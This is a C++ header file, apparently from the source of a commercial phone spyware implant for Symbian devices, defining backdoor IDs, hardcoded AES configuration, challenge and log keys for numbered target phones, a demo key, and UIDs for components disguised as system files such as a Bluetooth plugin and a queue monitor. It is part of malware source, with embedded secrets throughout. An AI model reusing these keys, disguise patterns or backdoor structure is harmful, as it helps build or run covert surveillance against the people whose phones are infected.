/*
 * Keys.h
 *
 *  Created on: 13/feb/2011
 *      Author: Giovanna
 */

#ifndef KEYS_H_
#define KEYS_H_

#include <e32std.h>
#include <e32base.h>

#define K_KEY_SIZE 16

//_LIT8(KVERSION, "\x1e\x98\xdd\x77");  //2011011102
//_LIT8(KVERSION,"\x25\xea\xdd\x77");  //2011032101
//_LIT8(KVERSION,"\x26\xea\xdd\x77");  //2011032102
//_LIT8(KVERSION,"\x27\xea\xdd\x77");		//2011032103
//_LIT8(KVERSION,"\x35\x5c\xde\x77");		//2011061301
//_LIT8(KVERSION,"\x36\x5c\xde\x77");		//2011061302
//_LIT8(KVERSION,"\x01\xd1\xde\x77");		//2011091201
_LIT8(KVERSION,"\x61\x25\xdf\x77");		//2011112801 7.5

// KEY Section

_LIT8(KIV, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");

// Backdoor Id
#ifdef _DEBUG
//_LIT8(KBACKDOORID, "RCS_0000000317\x00\x00");    //backdoor su prod/castore N97Mini
//_LIT8(KBACKDOORID, "RCS_0000000205\x00\x00");    //backdoor su prod N81
//_LIT8(KBACKDOORID, "RCS_0000000005\x00\x00");    //backdoor su preprod/polluce N97Mini
//_LIT8(KBACKDOORID, "RCS_0000000012\x00\x00");    //backdoor su preprod ExternalPartner
//_LIT8(KBACKDOORID, "RCS_0000000244\x00\x00");    //backdoor su preprod UZC Test
//_LIT8(KBACKDOORID, "RCS_0000000076\x00\x00");    //backdoor su preprod E71
_LIT8(KBACKDOORID, "RCS_0000000181\x00\x00");    //backdoor su preprod/polluce N96
//_LIT8(KBACKDOORID, "RCS_0000000475\x00\x00");    //backdoor su prod E61
//_LIT8(KBACKDOORID, "RCS_0000000063\x00\x00");    //backdoor su preprod E61
//_LIT8(KBACKDOORID, "RCS_0000000018\x00\x00");    //backdoor su preprod E72
//_LIT8(KBACKDOORID, "RCS_0000000453\x00\x00");    //backdoor su prod N97Mini UNINSTALL
//_LIT8(KBACKDOORID, "RCS_0000000135\x00\x00");    //backdoor su prod/castore E72
//_LIT8(KBACKDOORID, "RCS_0000000455\x00\x00");    //backdoor su prod/castore E71
//_LIT8(KBACKDOORID, "RCS_0000000125\x00\x00");    //backdoor su prod/castore N96
//_LIT8(KBACKDOORID, "RCS_0000000179\x00\x00");    //backdoor su polluce N81
#else
_LIT8(KBACKDOORID, "av3pVck1gb4eR2\x00\x00");
#endif

// ConfKey
#ifdef _DEBUG
//_LIT8(KAES_CONFIG_KEY,"2aea9bec25ee2bfc8b4ab86d24a4d7b8"); //RCS_0000000317  //N97mini prod/castore
//_LIT8(KAES_CONFIG_KEY,"cc2c7eff25615393e1d110194974c511"); //RCS_0000000205  //N81 prod
//_LIT8(KAES_CONFIG_KEY,"b22d3cd68cf1f376c86855823d0852a0"); //RCS_0000000005  //N97mini preprod/polluce
//_LIT8(KAES_CONFIG_KEY,"abce2a78b54420e9a33d70c212fe3d83"); //RCS_0000000012  //ExternalPartner preprod
//_LIT8(KAES_CONFIG_KEY,"9d63d54b84c634e5aca2a7a6c7b26967"); //RCS_0000000244  //UZC Test polluce
//_LIT8(KAES_CONFIG_KEY,"bffb2b51e298730bc6806de8de4869b9"); //RCS_0000000076  //E71 preprod
_LIT8(KAES_CONFIG_KEY,"28369b7618f651239be4739f79c708d1"); //RCS_0000000181  //N96 preprod/polluce
//_LIT8(KAES_CONFIG_KEY,"34e5e13c98d14d2317c4f52c513af286"); //RCS_0000000475  //E61 prod
//_LIT8(KAES_CONFIG_KEY,"71d6ccbcab12055099149ce3f5d752d9"); //RCS_0000000063  //E61 preprod
//_LIT8(KAES_CONFIG_KEY,"398cc8658b76f897825b3165fa939f6d"); //RCS_0000000018  //E72 preprod
//_LIT8(KAES_CONFIG_KEY,"28745df4927a0fcca3c40abae83c3881"); //RCS_0000000135  //E72 prod/castore
//_LIT8(KAES_CONFIG_KEY,"7cddcb1b75b6f702a21c4f917ea7c201"); //RCS_0000000455  //E71 prod/castore
//_LIT8(KAES_CONFIG_KEY,"7e0f09bed05d4f0ea6b7594efa1d4cdb"); //RCS_0000000125  //N96 prod/castore
//_LIT8(KAES_CONFIG_KEY,"13f49991883eae5ee4c68424e7e5660e"); //RCS_0000000453  //N97mini prod UNINSTALL
//_LIT8(KAES_CONFIG_KEY,"03ad0c9ff3a68f67725f3b6dc0a96d40"); //RCS_0000000179  //N81 polluce
#else
_LIT8(KAES_CONFIG_KEY, "Adf5V57gQtyi90wUhpb8Neg56756j87R");
#endif

//Challenge key or Signature, the same for all bkdoors on the same server
#ifdef _DEBUG
//_LIT8(KAES_CHALLENGE_KEY, "572ebc94391281ccf53a851330bb0d99"); //RCS_0000000317 //N97Mini prod/castore
//_LIT8(KAES_CHALLENGE_KEY, "96778af9756a30489f6435bb0655eec2"); //RCS_0000000012 //ExternalPartner preprod
_LIT8(KAES_CHALLENGE_KEY, "96778af9756a30489f6435bb0655eec2"); //RCS_0000000063 //E61 preprod/polluce
#else
_LIT8(KAES_CHALLENGE_KEY, "f7Hk0f5usd04apdvqw13F5ed25soV5eD");
#endif

//Log key
#ifdef _DEBUG
//_LIT8(KAES_LOGS_KEY, "95dac559b0edfffc543b06b46c43e610");  //RCS_0000000317  //N97Mini su prod/castore
//_LIT8(KAES_LOGS_KEY, "87f8398188d816f74657188b7e2a1370");  //RCS_0000000205  //N81 su prod
//_LIT8(KAES_LOGS_KEY, "a875373040a90f4a8d8dfc00ef4cc645");  //RCS_0000000005  //N97Mini su preprod/polluce
//_LIT8(KAES_LOGS_KEY, "0640685495f69a6d250951f9e707ed1b");  //RCS_0000000012  //ExternalPartner su preprod
//_LIT8(KAES_LOGS_KEY, "909726a2c42b7ca56d86b0f16000f311");  //RCS_0000000244  //UZC Test su polluce
//_LIT8(KAES_LOGS_KEY, "656b3dff1c1efa25e8348639e76a7973");  //RCS_0000000076  //E71 su preprod
_LIT8(KAES_LOGS_KEY, "916db3525f83762320b07e024eb00270");  //RCS_0000000181  //N96 su preprod/polluce
//_LIT8(KAES_LOGS_KEY, "1b50df977cef743ea28f019bde34c727");  //RCS_0000000012  //E61 su prod
//_LIT8(KAES_LOGS_KEY, "afb16f3085c03382929057fd804ee9c9");  //RCS_0000000063  //E61 su preprod
//_LIT8(KAES_LOGS_KEY, "d4078fdf640118f158792a39cf70bab4");  //RCS_0000000135  //E72 su prod/castore
//_LIT8(KAES_LOGS_KEY, "597cd89c7e39d395438113da1c879940");  //RCS_0000000455  //E71 su prod/castore
//_LIT8(KAES_LOGS_KEY, "02ab00be97a461fedf9ceeacb0ef73f3");  //RCS_0000000125  //N96 su prod
//_LIT8(KAES_LOGS_KEY, "36cf605bf75fd11edde58b6ec98997e6");  //RCS_0000000453  //N97Mini su prod UNINSTALL
//_LIT8(KAES_LOGS_KEY, "96db502bbee4cd75f09a7aa9d3c6d659");  //RCS_0000000246  //Montalbano
//_LIT8(KAES_LOGS_KEY, "02ab00be97a461fedf9ceeacb0ef73f3");  //RCS_0000000125  //N96 prod/castore
//_LIT8(KAES_LOGS_KEY, "321700fc1dbabd05a3551dc424bf37bc");  //RCS_0000000018  //E72 preprod
//_LIT8(KAES_LOGS_KEY, "87f8398188d816f74657188b7e2a1370");  //RCS_0000000205  //N81
//_LIT8(KAES_LOGS_KEY, "1597bb504632f51edd98ce83184c29c3");  //RCS_0000000179  //N81 su polluce
#else
_LIT8(KAES_LOGS_KEY, "3j9WmmDgBqyU270FTid3719g64bP4s52");
#endif

//Demo key
#ifdef _DEBUG
_LIT8(KDEMO_KEY,"hxVtdxJ/Z8LvK3ULSnKRUmJO");
#else
_LIT8(KDEMO_KEY,"hxVtdxJ/Z8LvK3ULSnKRUmLE");
#endif
//CCITT CRC (16 bits, polynomial 0x1021 and initial value 0xffff) of "hxVtdxJ/Z8LvK3ULSnKRUmLE"
const TUint16 KCrcDemoKey=0x2e2; 

// UID Section

#ifdef _DEBUG
_LIT8(KUidBackdoor,"0x20024d7a");   // fake btdsplugin.sis (encapsulates all executables below)
//_LIT8(KUidBackdoor,"0x200305D7");   // btdsplugin.sis (encapsulates all executables below)
#else
_LIT8(KUidBackdoor,"0x[:UID1:]");
#endif
#ifdef _DEBUG
_LIT8(KUidCore,"0x2002aa96");		// fake SharedQueueMon.exe
//_LIT8(KUidCore,"0x20030635");		// SharedQueueMon.exe
#else
_LIT8(KUidCore,"0x[:UID2:]");
#endif
#ifdef _DEBUG
_LIT8(KUidSQSrv,"0x200246be");		// fake SharedQueueSrv.exe  
//_LIT8(KUidSQSrv,"0x20030634");		// SharedQueueSrv.exe
#else
_LIT8(KUidSQSrv,"0x[:UID3:]");
#endif
#ifdef _DEBUG
_LIT8(KUidSQCli,"0x2002b30d");		// fake SharedQueueCli.dll 
//_LIT8(KUidSQCli,"0x20030633");		// SharedQueueCli.dll
#else
_LIT8(KUidSQCli,"0x[:UID4:]");
#endif
#ifdef _DEBUG
_LIT8(KUidUninstaller,"0x20030de3");  // fake Uninstaller.exe and Uninstaller.sis 
//_LIT8(KUidUninstaller,"0x200305DB");  // Uninstaller.exe and Uninstaller.sis 
#else
_LIT8(KUidUninstaller,"0x[:UID5:]");
#endif
#ifdef _DEBUG
_LIT8(KUidMonitor,"0x2000c83e");	  // fake UninstMonitor.exe	
//_LIT8(KUidMonitor,"0x200316ED");	  // UninstMonitor.exe	
#else
_LIT8(KUidMonitor,"0x[:UID6:]");
#endif

inline 
TUid GetUid(const TDesC8& aUidBuf)
	{
	TBuf8<12> hexBuf(aUidBuf);
	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
	TLex8 lex(hexBuf);
	TUint32 uid;
	lex.Val(uid,EHex);
	TUid kUid = TUid::Uid(uid);
	return kUid;	
	}

/**
KPropertyUidCore
Property reserved for the core
*/
const TUid KPropertyUidCore = GetUid(KUidCore);
/**
KPropertyFreeSpaceThreshold
The key to observe changes in available space on disk.
Will be updated when the threshold is passed: 1=below threshold, 0=above threshold
*/
const TUint KPropertyFreeSpaceThreshold = 2; 


#endif /* KEYS_H_ */
